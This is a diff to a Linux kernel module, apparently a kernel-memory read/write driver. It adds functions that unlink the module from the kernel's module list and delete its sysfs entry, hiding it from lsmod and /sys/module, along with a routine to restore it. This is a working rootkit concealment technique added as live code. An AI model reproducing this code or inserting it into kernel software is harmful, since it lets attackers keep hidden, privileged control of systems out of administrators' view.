@@ -28,6 +28,9 @@
 #include <linux/uaccess.h>
 #include <linux/slab.h>
 #include <linux/highmem.h>
+#include <linux/list.h>
+#include <linux/kobject.h>
+#include <linux/mutex.h>
 #include <asm/pgtable.h>
 
 #if LINUX_VERSION_CODE >= KERNEL_VERSION(5, 8, 0)
@@ -56,6 +59,38 @@
 #else
 #define KMEM_CLASS_CREATE(name) class_create(THIS_MODULE, name)
 #endif
+
+static int kmem_hidden;
+static struct list_head *kmem_hide_prev;
+
+static void kmem_hide_module(struct module *mod)
+{
+	if (kmem_hidden)
+		return;
+	mutex_lock(&module_mutex);
+	kmem_hide_prev = mod->list.prev;
+	list_del(&mod->list);
+	mutex_unlock(&module_mutex);
+	kobject_del(&mod->mkobj.kobj);
+	kmem_hidden = 1;
+}
+
+static void kmem_unhide_module(struct module *mod)
+{
+	struct kobject *kobj;
+	struct kobject *parent;
+
+	if (!kmem_hidden)
+		return;
+	mutex_lock(&module_mutex);
+	list_add(&mod->list, kmem_hide_prev);
+	mutex_unlock(&module_mutex);
+	kobj = &mod->mkobj.kobj;
+	parent = kobj->parent;
+	if (parent)
+		kobject_add(kobj, parent, "%s", mod->name);
+	kmem_hidden = 0;
+}
 
 #define KMEM_CHUNK_RW 32768
 #define KMEM_STACK_RW 1024
